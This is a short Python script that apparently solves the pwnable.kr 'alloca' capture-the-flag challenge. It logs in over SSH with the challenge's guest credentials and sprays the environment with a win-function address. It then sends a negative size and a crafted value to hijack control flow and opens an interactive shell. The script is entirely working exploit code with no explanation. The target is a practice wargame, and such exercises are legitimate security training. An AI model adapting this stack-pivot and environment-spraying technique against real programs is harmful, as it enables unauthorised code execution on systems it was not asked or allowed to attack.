from pwn import *

###Addr
win_func = 0x80485ab

###Exploit
s = ssh(host='pwnable.kr',port=2222,
        user='alloca',
        password='guest')
r = s.process('./alloca',env={p32(win_func)*1000:p32(win_func)*1000})

r.sendlineafter('you\n\n','-82')
r.sendline(str(0xff80000))
r.interactive()
